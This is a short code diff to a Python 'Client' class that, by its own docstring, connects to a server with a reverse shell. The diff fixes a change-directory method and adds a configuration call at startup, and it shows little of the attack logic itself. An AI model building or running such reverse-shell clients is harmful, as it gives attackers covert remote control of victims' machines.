@@ -165,9 +165,9 @@ class Client(object):
         return Client.encryption.func_dict
 
     @public
-    def cd(self, path):
+    def cd(self, path='.'):
         """change directory"""
-        return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
+        return os.chdir(path) if os.path.isdir(path) else os.chdir('.')
 
 
     @public
@@ -481,6 +481,7 @@ class Client(object):
     def start(self):
         """\trun startup routines and connect to server with reverse shell"""
         self._info = self._get_info()
+        self._configure()
         self._connect()
         time.clock()
         self._send(json.dumps(self._info), method=self.start.func_name)
